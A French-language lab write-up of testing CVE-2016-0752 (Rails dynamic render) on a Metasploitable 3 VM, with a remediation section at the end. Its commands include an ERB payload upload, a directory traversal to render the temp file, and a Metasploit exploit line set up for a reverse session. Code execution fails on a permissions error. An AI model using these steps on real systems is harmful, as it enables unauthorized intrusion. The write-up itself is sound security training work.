# Write-up — WEBrick / Rails custom app : Dynamic Render (Metasploitable 3, port 3500)

Cible : `172.28.128.3:3500/readme` · CVE-2016-0752 · Résultat : **vulnérabilité confirmée et
mécanisme d'exploitation reproduit en partie**, exécution de code non obtenue dans cette
session (bloqué par un problème d'environnement distinct de la faille elle-même, cause
identifiée).

Tout ce qui suit est copier-coller direct (testé en zsh), côté 🖥 Kali uniquement.

---

## 1. Recon — le service était éteint

```bash
nmap -sC -sV -p 3500 172.28.128.3
```
```
3500/tcp closed rtmp-port
```
Le port est fermé, alors que `ms3/parcours.md` le liste comme ouvert (WEBrick 1.3.1, Ruby
2.3.8). Diagnostic via l'accès shell déjà obtenu sur cette cible par la backdoor UnrealIRCd
(voir `ms3/jules/unrealircd.md`) :
```bash
ps aux | grep -i rail   # rien
cat /opt/readme_app/start.sh
```
```
cd /opt/readme_app
bundle install --path vendor/bundle
bundle exec rails s -b 0.0.0.0 -p 3500
```
Ce service n'est **pas** géré par upstart (pas de démarrage automatique) — il doit être lancé
manuellement, et ne l'avait jamais été dans cette instance de VM. Première tentative de
lancement :
```
A server is already running. Check /opt/readme_app/tmp/pids/server.pid.
```
Un fichier `tmp/pids/server.pid` périmé (processus mort sans nettoyage) bloquait le
redémarrage, et `boba_fett` n'a pas les droits d'écriture sur ce fichier (propriété
`chewbacca`) pour le supprimer. Contournement : relancer avec un fichier pid alternatif
(`-P /tmp/custom_server.pid`) :
```bash
cd /opt/readme_app && bundle exec rails s -b 0.0.0.0 -p 3500 -P /tmp/custom_server.pid
```
```
[...] WEBrick::HTTPServer#start: pid=2714 port=3500
```
Service relancé avec succès, conforme à la version annoncée par `parcours.md`.

## 2. Méthode d'identification de la CVE et du module

Pas de produit connu à chercher sur `searchsploit` au premier abord — c'est une appli Rails
maison. Lecture directe du code source via l'accès shell existant :
```bash
cat /opt/readme_app/config/routes.rb
cat /opt/readme_app/app/controllers/readme_controller.rb
```
```ruby
class ReadmeController < ApplicationController
  def index
    puts "params[:os] is #{params[:os]}" if params[:os]
    template = 'default'
    template = params[:os] if params[:os]
    render template
  end
end
```
Un paramètre contrôlé par l'utilisateur (`params[:os]`) est passé directement à `render` — le
schéma exact qui a motivé la recherche :
```bash
searchsploit rails render
```
```
Ruby on Rails - Dynamic Render File Upload | multiple/remote/40561.rb
```
```bash
msfconsole -q -x "search rails render; exit"
```
```
exploit/multi/http/rails_dynamic_render_code_exec  2016-10-16  excellent  Yes
```
```bash
msfconsole -q -x "info exploit/multi/http/rails_dynamic_render_code_exec; exit"
```
```
References: CVE-2016-0752
```
**CVE-2016-0752.** Quand un contrôleur Rails appelle `render` avec une chaîne fournie par
l'utilisateur, Rails (jusqu'à la version 5.0.0.beta1.1) décide dynamiquement d'interpréter
cette chaîne comme un nom de template si elle contient un `/`. Le lookup de template reste
« sandboxé » dans `app/views/`, mais ce sandbox est contournable par traversée de répertoire
(`../`). Combiné à l'upload d'un fichier arbitraire sur n'importe quelle route POST (Rails
écrit tout fichier uploadé dans un fichier temporaire prévisible sous `/tmp/`, dont le chemin
exact fuite dans les pages d'erreur très verbeuses de l'environnement de développement), un
attaquant peut faire rendre comme template ERB un fichier qu'il contrôle entièrement —
exécution de code arbitraire.

## 3. Démarche d'exploitation manuelle

**Étape 1 — fuite du chemin du fichier temporaire.** Un GET avec un corps multipart (upload
d'un fichier contenant du code ERB) déclenche une tentative de rendu du template invalide
(`os=nonexistent_template_xyz`), qui échoue en 500 et révèle le chemin exact du fichier
temporaire créé par Rack dans le message d'erreur (capture a) :
```bash
printf '%s' '<%= `id` %>' > payload.gif
curl -s -X GET "http://172.28.128.3:3500/readme?os=nonexistent_template_xyz" \
  -F "evil=@payload.gif;type=image/gif"
```
```
Tempfile:/tmp/RackMultipart20261017-2714-jw7bx8.gif
```
Confirmé avec une extension `.html.erb` sur le fichier uploadé (pour que Rails détecte le bon
gestionnaire ERB lors du rendu) :
```
Tempfile:/tmp/RackMultipart20261017-2714-1450aiu.erb
```
Vérifié directement sur la cible (accès shell existant) que le fichier reste bien présent sur
le disque après la réponse HTTP — pas de nettoyage automatique (`Rack::TempfileReaper`
n'existe pas encore dans la version de Rack utilisée ici, `1.6.4`) :
```bash
ls -la /tmp/RackMultipart*
```
```
-rw------- 1 boba_fett users 9 Oct 17 01:01 /tmp/RackMultipart20261017-2714-jw7bx8.gif
```

**Étape 2 — traversée de répertoire pour échapper au sandbox `app/views/`.** Passer
l'absolu `/tmp/...` directement en paramètre `os` ne fonctionne pas : Rails cherche un
template **relatif** à `app/views/` (`"Searched in: /opt/readme_app/app/views"`), pas un
fichier au sens filesystem brut. En remontant de 4 niveaux depuis `app/views/` jusqu'à `/`
(`views → app → readme_app → opt → /`) :
```bash
curl -s -G "http://172.28.128.3:3500/readme" \
  --data-urlencode "os=../../../../tmp/RackMultipart20261017-2714-1450aiu"
```
Résultat : l'erreur change de `ActionView::MissingTemplate` à `Errno::EACCES` — **le fichier a
bien été trouvé et le rendu a commencé** (capture b) :
```
Errno::EACCES in Readme#index
Showing /opt/readme_app/app/views/layouts/application.html.erb where line #14 raised:
Permission denied @ dir_s_mkdir - /opt/readme_app/tmp/cache/assets
```
La traversée fonctionne : Rails a localisé et commencé à traiter le fichier temporaire
contrôlé par l'attaquant. L'échec qui suit n'a **rien à voir** avec la faille elle-même —
c'est le *layout* (`application.html.erb`, qui enveloppe toute vue rendue) qui tente de créer
un répertoire de cache pour le pipeline d'assets (Sprockets), et `boba_fett` n'a pas les
droits d'écriture sur `/opt/readme_app/tmp/cache/` (répertoire appartenant à `chewbacca`) —
avant même d'atteindre l'exécution du code ERB injecté dans la vue elle-même.

## 4. Metasploit — même résultat, pas de session

```bash
msfconsole -q -x "use exploit/multi/http/rails_dynamic_render_code_exec; set RHOSTS 172.28.128.3; set RPORT 3500; set URIPATH /readme; set SRVHOST 172.28.128.1; set SRVPORT 8089; set LHOST 172.28.128.1; set LPORT 4495; exploit; sleep 10; sessions -l; exit -y"
```
```
[*] uploading image...
[*] Server stopped.
[!] This exploit may require manual cleanup of '/tmp/sxZeTFmu' on the target
Exploit completed, but no session was created.
```
Le module va plus loin que la détection (il tente l'upload et le téléchargement du stage),
mais échoue lui aussi à obtenir une session — cohérent avec le blocage identifié
manuellement : la chaîne de rendu touche le même obstacle filesystem avant que le payload
exécutable ne puisse se déclencher.

## 5. Bilan

**Vulnérabilité confirmée** (CVE-2016-0752, code source vérifié) et **mécanisme
d'exploitation reproduit jusqu'à l'étape de rendu du fichier contrôlé** (fuite du chemin +
traversée de répertoire fonctionnelles), mais l'exécution de code n'a pas été observée dans
cette session : un problème de permissions filesystem propre à cette instance (droits
`chewbacca` vs `boba_fett` sur `tmp/cache/assets`) interrompt le rendu avant d'atteindre le
contenu ERB injecté, et bloque également le module Metasploit officiel pour la même raison
sous-jacente.

---

## Remédiation

- Mettre à jour Rails au-delà de la version patchée (5.0.0.beta1.1) — corrige la logique de
  normalisation des arguments de `render` à la source.
- Ne **jamais** passer une chaîne contrôlée par l'utilisateur directement à `render` — utiliser
  une liste blanche explicite de templates autorisés (`case params[:os]; when 'linux',
  'windows' then ...; else 'default'; end`), jamais le paramètre brut.
- Restreindre les permissions d'écriture sur les répertoires de cache applicatifs à
  l'utilisateur qui exécute réellement le service.

---

**Pour rejouer tout le scénario depuis zéro** : `./start.sh` (démarre la VM), le service
`/opt/readme_app` doit être relancé manuellement (voir section 1), puis les étapes 2 à 4 dans
l'ordre.

**Suite du parcours MS3 :** diagnostic des ports intermittents 3000 et 8181.
